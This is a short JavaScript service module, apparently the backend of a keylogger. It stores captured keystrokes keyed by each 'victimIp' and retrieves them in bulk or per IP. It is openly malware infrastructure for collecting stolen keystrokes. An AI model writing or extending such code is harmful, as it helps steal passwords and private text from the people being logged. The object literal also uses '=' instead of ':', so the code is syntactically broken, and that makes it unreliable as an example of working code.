const keyloggerRepo = require("../repository/keyloggerRepo");

const keyloggerService = {
    saveKeystrokes = postReq => {
        keyloggerRepo.saveStrokes(postReq.victimIp, postReq.keystrokes);
    },
    getKeyStrokes = () => {
        return keyloggerRepo.getAllStrokes();
    },
    getKeyStrokesByIp = ipAddr => {
        return keyloggerRepo.getStrokesByIp(ipAddr);
    }
};